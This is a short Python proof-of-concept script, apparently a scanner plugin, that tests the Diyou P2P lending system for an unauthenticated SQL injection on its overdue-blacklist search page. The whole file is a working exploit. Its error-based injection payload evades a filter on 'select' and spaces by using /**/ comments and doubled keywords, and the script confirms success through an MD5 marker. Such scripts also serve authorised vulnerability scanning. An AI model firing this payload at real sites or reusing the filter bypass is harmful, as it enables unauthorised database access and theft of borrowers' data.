#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 帝友P2P借贷系统无需登录SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2011-150130
author: Lucifer
description: 帝友P2P借贷系统/lates/index.html逾期黑名单搜索处过滤了select和空格，利用/**/和双写select可以绕过
'''
import sys
import requests
import warnings
from termcolor import cprint

class dyp2p_latesindex_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/lates/index.html?username=123%27/**/and/**/(seleselectct/**/1/**/from/**/(selselectect/**/count(*),concat(0x7e,MD5(%271234%27),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在帝友P2P借贷系统 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dyp2p_latesindex_sqli_BaseVerify(sys.argv[1])
    testVuln.run()